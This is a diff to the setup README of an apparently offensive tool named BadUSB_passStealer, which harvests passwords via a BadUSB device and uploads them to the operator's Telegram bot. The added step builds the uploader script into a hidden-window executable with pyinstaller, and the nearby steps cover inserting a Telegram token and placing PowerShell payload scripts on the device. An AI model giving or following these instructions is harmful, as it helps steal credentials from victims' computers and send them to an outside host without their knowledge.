@@ -145,6 +145,12 @@ cd BadUSB_passStealer
 
 5. Replace TOKEN and CHAT_ID with your personal Telegram token and chat_id [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/telegram_uploader.py) at line 6 and 7;
 
+6. Convert telegram_uploader.py in exe file with this command :
+```
+pip install pyinstaller
+pyinstaller --onefile -w telegram_uploader.py
+```
+
 7. Download 7-Zip Extra: standalone console version, 7z DLL, Plugin for Far Manager [here](https://www.7-zip.org/download.html)
 
 8. Put BadUSB_passStealer.txt in the root directory of your MMS, ciaoV2_storage.ps1 in MMS/passStealer/, fin_storage.ps1 in MMS/passStealer, 7z/ in MMS/passStealer and tools.zip in MMS/passStealer;
